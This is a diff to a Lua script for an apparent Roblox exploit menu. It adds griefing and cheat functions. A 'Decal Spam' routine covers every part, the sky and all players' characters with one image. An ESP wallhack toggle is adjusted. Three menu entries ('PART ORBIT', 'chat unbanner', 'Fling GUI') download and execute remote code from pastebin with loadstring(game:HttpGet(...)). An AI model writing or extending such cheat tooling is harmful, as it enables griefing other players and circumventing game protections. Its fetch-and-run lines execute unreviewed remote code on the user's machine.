@@ -109,10 +109,7 @@ function FunctionManager:cycleCategory()
 	return self:getCurrentCategory()
 end
 
--- Destroy old GUI
-if PlayerGui:FindFirstChild("C00lGUI") then
-	PlayerGui.C00lGUI:Destroy()
-end
+
 
 -- ScreenGui
 local screenGui = Instance.new("ScreenGui")
@@ -412,7 +409,76 @@ FunctionManager.OnFunctionAdded.Event:Connect(updateGrid)
 -- Initialize
 updateGrid()
 
+FunctionManager:register("Decal Spam", function()
+	local decalID = 8408806737
+	local function exPro(root)
+		for _, v in pairs(root:GetChildren()) do
+			if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
+				v.Parent = nil
+			elseif v:IsA("BasePart") then
+				v.Material = "Plastic"
+				v.Transparency = 0
+				local One = Instance.new("Decal", v)
+				local Two = Instance.new("Decal", v)
+				local Three = Instance.new("Decal", v)
+				local Four = Instance.new("Decal", v)
+				local Five = Instance.new("Decal", v)
+				local Six = Instance.new("Decal", v)
+				One.Texture = "http://www.roblox.com/asset/?id="..decalID
+				Two.Texture = "http://www.roblox.com/asset/?id="..decalID
+				Three.Texture = "http://www.roblox.com/asset/?id="..decalID
+				Four.Texture = "http://www.roblox.com/asset/?id="..decalID
+				Five.Texture = "http://www.roblox.com/asset/?id="..decalID
+				Six.Texture = "http://www.roblox.com/asset/?id="..decalID
+				One.Face = "Front"
+				Two.Face = "Back"
+				Three.Face = "Right"
+				Four.Face = "Left"
+				Five.Face = "Top"
+				Six.Face = "Bottom"
+			end
+			exPro(v)
+		end
+	end
+	local function asdf(root)
+		for _, v in pairs(root:GetChildren()) do
+			asdf(v)
+		end
+	end
+	exPro(game.Workspace)
+	asdf(game.Workspace)
 
+	local s = Instance.new("Sky")
+	s.Name = "Sky"
+	s.Parent = game.Lighting
+	local skyboxID = 8408806737
+	s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
+	s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
+	s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
+	s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
+	s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
+	s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
+	game.Lighting.TimeOfDay = 12
+
+	for i, v in pairs(game.Players:GetChildren()) do
+		local emit = Instance.new("ParticleEmitter")
+		emit.Parent = v.Character.Torso
+		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
+		emit.VelocitySpread = 20
+	end
+	for i, v in pairs(game.Players:GetChildren()) do
+		local emit = Instance.new("ParticleEmitter")
+		emit.Parent = v.Character.Torso
+		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
+		emit.VelocitySpread = 20
+	end
+	for i, v in pairs(game.Players:GetChildren()) do
+		local emit = Instance.new("ParticleEmitter")
+		emit.Parent = v.Character.Torso
+		emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
+		emit.VelocitySpread = 20
+	end
+end, "Troll", "NOT FE")
 FunctionManager:register("Bind Key", function()
 	if bindFrame then return end 
 
@@ -811,7 +877,7 @@ FunctionManager:register("ESP Toggle", function()
 			end
 		end
 	end
-	NotifyERROR("ESP " .. (espOn and "Enabled" or "Disabled"))
+	Notify("ESP " .. (espOn and "Enabled" or "Disabled"), "SYSTEM", 3)
 end, "Visual", "ur cooked i just got wallhacks")
 FunctionManager:register("JumpPowerSlider", function()
 	if screenGui:FindFirstChild("JumpPowerModal") then return end
@@ -1347,9 +1413,17 @@ end, "Troll", "HATS")
 
 
 
+FunctionManager:register("PART ORBIT", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/aZjaAr6F", true))()
+end, "Troll", "Probs better orbit")
 
 
-
+FunctionManager:register("chat unbanner", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/aDFhvMC4", true))()
+end, "Utility", "Credits to the original maker!")
+FunctionManager:register("Fling GUI", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/VynRhxJV", true))()
+end, "Troll", "Credits to the original maker!")
 
 
 
